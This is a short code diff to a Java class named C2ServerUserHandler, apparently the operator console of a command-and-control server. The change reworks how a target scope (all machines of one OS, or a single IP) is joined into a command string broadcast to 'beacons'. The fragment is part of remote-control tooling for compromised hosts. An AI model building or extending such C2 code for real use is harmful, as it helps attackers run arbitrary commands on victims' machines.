@@ -204,15 +204,17 @@ public class C2ServerUserHandler implements Runnable{
         System.out.print(currentUserPath + " >> ");
         String userInput = userInputScanner.nextLine();
 
+        String scope = "";
+
         // Send commands to all Windows or Linux machines
         if(userInput.equals("1")){
-            currentUserPath += " All";
+            scope = OS;
 
         // Send commands to single IP
         } else if(userInput.equals("2")){
             System.out.print("Enter IP Address of desired target >> ");
             String IPAddress = userInputScanner.nextLine();
-            currentUserPath += " " + IPAddress;
+            scope = IPAddress;
         
         // Send user back to Command Menu
         } else if(userInput.equals("3")){
@@ -224,7 +226,7 @@ public class C2ServerUserHandler implements Runnable{
         // Take commands from user
         if(userInput.equals("1") || userInput.equals("2")){
             System.out.print("Enter Command to be run >> ");
-            String finalCommand = currentUserPath + "_" + userInputScanner.nextLine();
+            String finalCommand = "Command " + scope + "_" + userInputScanner.nextLine();
             C2server.broadcastToBeacons(finalCommand);
             currentUserPath = "Command " + OS;
         }
